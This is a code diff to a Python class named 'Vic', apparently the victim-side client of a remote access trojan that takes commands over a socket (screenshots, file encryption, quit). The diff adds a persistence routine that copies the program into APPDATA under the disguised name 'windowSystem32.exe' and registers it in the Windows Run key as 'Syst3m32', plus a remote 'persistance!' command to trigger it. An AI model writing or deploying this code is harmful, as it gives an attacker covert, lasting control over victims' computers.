@@ -25,6 +25,22 @@ class Vic():
             self.__connect__()
 
 
+    def persistence(self):
+        try:
+            path = os.environ["APPDATA"] + "\\windowSystem32.exe"
+            f = open(sys.executable,"rb")
+            f2 = open(path,"wb")
+            f2.write(f.read())
+            f.close()
+            f2.close()
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Syst3m32 /t REG_SZ /d '+path+'',shell=True)
+            self.s.send(b"[+] Persistenced!")
+
+        except Exception as e:
+            f = f"[-] {str(e)[str(e).find(']')+2:]}"
+            f = f.encode()
+            self.s.send(f)
+    
     def simple_encrypt(self,f_name):
             try:
                 f = open(f_name,"rb")
@@ -101,6 +117,9 @@ class Vic():
             elif (cmd == "quit!"):
                     self.s.close()
                     sys.exit(0)
+
+            elif (cmd == "persistance!"):
+                self.persistence()
 
             elif (cmd[:3] == "ss!"):
                 self.screenShot(cmd[4:])
